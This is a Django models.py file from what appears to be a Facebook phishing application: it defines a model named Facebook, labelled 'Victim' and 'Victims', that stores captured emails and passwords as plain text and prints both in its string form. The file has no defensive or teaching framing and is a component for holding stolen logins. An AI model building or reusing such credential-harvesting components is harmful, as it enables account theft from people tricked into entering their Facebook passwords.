from django.db import models
from django.utils.translation import gettext_lazy as _

# Create your models here.
class Facebook(models.Model):
  class Meta:
    verbose_name = _("Victim")
    verbose_name_plural = _("Victims")
  
  email = models.fields.TextField(verbose_name=_("Username"), blank=False)
  password = models.fields.TextField(verbose_name=_("Password"), blank=False)

  def __str__(self) -> str:
    return f"Email: {self.email} Password: {self.password}"
